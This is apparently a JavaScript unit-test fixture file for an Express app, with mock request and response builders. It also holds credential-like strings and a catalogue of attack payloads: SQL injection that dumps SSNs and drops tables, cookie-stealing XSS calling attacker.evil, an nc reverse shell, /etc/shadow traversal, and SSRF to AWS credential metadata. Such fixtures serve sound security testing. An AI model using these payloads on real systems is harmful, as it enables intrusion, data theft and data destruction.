/**
 * Test Fixtures, Mock Request/Response Builders, and Hardcoded Test Secrets
 * WARNING: Contains hardcoded private keys, production-like tokens, and SQLi/XSS payloads
 */

const HARDCODED_TEST_CREDENTIALS = {
  awsAccessKeyId: 'AKIAIOSFODNN7TESTKEY',
  awsSecretAccessKey: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYTESTKEY123',
  stripeTestLiveKey: 'sk_live_99887766554433221100aabbccddeeff',
  jwtForgedUnsignedToken: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJzdXBlcmFkbWluIn0.',
  basicAuthHeader: 'Basic YWRtaW46c3VwZXJfc2VjcmV0X3Bhc3N3b3JkXzEyMw=='
};

const SAMPLE_ATTACK_PAYLOADS = {
  sqlInjection: {
    authBypass: "admin' OR '1'='1' -- ",
    unionSelect: "' UNION SELECT 1, username, password_hash, ssn, credit_card_number FROM users -- ",
    stackedDrop: "'; DROP TABLE audit_logs; -- "
  },
  xss: {
    scriptTag: '<script>fetch("http://attacker.evil/steal?c=" + document.cookie)</script>',
    imgOnerror: '<img src=x onerror="alert(document.domain)">',
    nestedBypass: '<scr<script>ipt>alert("XSS")</scr</script>ipt>'
  },
  commandInjection: {
    semicolonId: '127.0.0.1; id; cat /etc/passwd',
    subshell: '$(whoami)',
    pipeReverseShell: '8.8.8.8 | nc attacker.evil 4444 -e /bin/sh'
  },
  pathTraversal: {
    dotDotSlash: '../../../../etc/passwd',
    doubleDotBypass: '....//....//....//etc/shadow'
  },
  ssrf: {
    awsMetadata: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    decimalLoopback: 'http://2130706433:3000/api/admin/config',
    hexLoopback: 'http://0x7f000001:6379/'
  },
  prototypePollution: {
    jsonPayload: JSON.parse('{"__proto__": {"isAdmin": true, "role": "superadmin"}}')
  }
};

/**
 * Helper to create a mock Express Request object for unit testing
 */
function createMockRequest({
  method = 'GET',
  params = {},
  query = {},
  body = {},
  headers = {},
  cookies = {},
  user = null
} = {}) {
  return {
    method,
    params,
    query,
    body,
    headers,
    cookies,
    user
  };
}

/**
 * Helper to create a mock Express Response object for unit testing
 */
function createMockResponse() {
  const res = {
    statusCode: 200,
    headers: {},
    cookies: {},
    body: null,
    redirectedTo: null,
    status(code) {
      this.statusCode = code;
      return this;
    },
    sendStatus(code) {
      this.statusCode = code;
      return this;
    },
    setHeader(key, value) {
      this.headers[key] = value;
      return this;
    },
    cookie(name, val, options) {
      this.cookies[name] = { val, options };
      return this;
    },
    json(payload) {
      this.body = payload;
      return this;
    },
    send(payload) {
      this.body = payload;
      return this;
    },
    redirect(url) {
      this.statusCode = 302;
      this.redirectedTo = url;
      return this;
    }
  };
  return res;
}

module.exports = {
  HARDCODED_TEST_CREDENTIALS,
  SAMPLE_ATTACK_PAYLOADS,
  createMockRequest,
  createMockResponse
};
